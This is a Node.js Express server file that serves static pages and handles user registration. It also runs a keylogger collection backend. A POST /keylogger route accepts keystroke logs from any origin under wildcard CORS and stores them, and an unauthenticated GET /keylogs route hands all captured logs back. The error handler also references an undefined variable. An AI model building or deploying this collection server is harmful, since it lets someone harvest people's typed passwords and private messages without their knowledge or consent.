const express = require("express");
const cors = require("cors");
const morgan = require("morgan");
const bodyParser = require("body-parser");
const backUtils = require("./back-utils");
const path = require("path");
const app = express();
const helmet = require("helmet");
const bcrypt = require("bcrypt");
const urlencoded = bodyParser.urlencoded({ extended: false });
let logTo = "./statistics.json";
if (process.env.NODE_ENV === "test") {
  logTo = "routes/test-statistics.json";
}

const errorHandler = (error, request, response, next) => {
  console.error(error.message);
  if (error.name === "CastError") {
    return response.status(400).send({ error: "malformatted id" });
  } else if (error.name === "validationError") {
    return response.status(400).json({ error: { message } });
  }
  next(error);
};
const unknownEndpoint = (request, response) => {
  response.status(404).send({ error: "unknown endpoint" });
};

app.use(
  cors({
    allowedHeaders: ["Content-Type"],
    origin: "*",
    preflightContinue: true,
  })
);
app.use(express.json());
const parentDir = path.normalize(__dirname + "/..");
app.use("/public", express.static("./public"));
app.use("/views", express.static("./views"));
app.get("/", (req, res) => {
  res.sendFile(parentDir + "/views/index.html");
});
app.use(helmet());
app.use(morgan("tiny"));
const saltRounds = 10;

app.post("/keylogger", async (req, res) => {
  const logObject = req.body;
  backUtils.logKey("logs", JSON.stringify(logObject));
  res.status(200).send("DONE");
});

app.post("/register", urlencoded, async (req, res) => {
  try {
    const { username, password } = req.body;
    bcrypt.hash(password, saltRounds, async function (err, hash) {
      if (err) {
        console.error(err);
        return res.status(400).json({ success: false });
      }
      backUtils.addUser("users", JSON.stringify({ username, password: hash }));
      // const fileData = backUtils.readUsersFile("users");

      return res.status(200).send("Successfully created a new user!");
    });
  } catch (error) {
    console.error(error);
  }
});

app.get("/keylogs", async (req, res) => {
  const allKeyLogs = backUtils.tempArr;
  res.status(200).send(JSON.stringify(allKeyLogs));
});

// app.put("/login", async (req, res) => {
//   try {
//     const { username, password } = req.body;
//     const fileData = await backUtils.readUsersFile("users");
//     let findUser;
//     if (fileData[0].length > 1) {
//       findUser = fileData[0].find((user) => user.username === username);
//     } else {
//       findUser = fileData.find((user) => user.username === username);
//     }
//     if (!findUser) {
//       res.status(200).send("User not found!");
//     }
//     const hash = findUser.password;
//     await bcrypt.compare(password, hash, async function (err, result) {
//       if (result == true) {
//         const id = findUser.id;
//         userFile = await backUtils.readUsersFile(id);
//         const user = new controller.User(
//           userFile,
//           findUser.username,
//           findUser.id
//         );
//         res.status(200).send(JSON.stringify(user));
//       } else if (result == false) {
//         res.status(400).json({ message: `user not found` });
//       }
//     });
//   } catch (error) {
//     console.error(error);
//   }
// });

app.use(errorHandler);
app.use(unknownEndpoint);

module.exports = app;
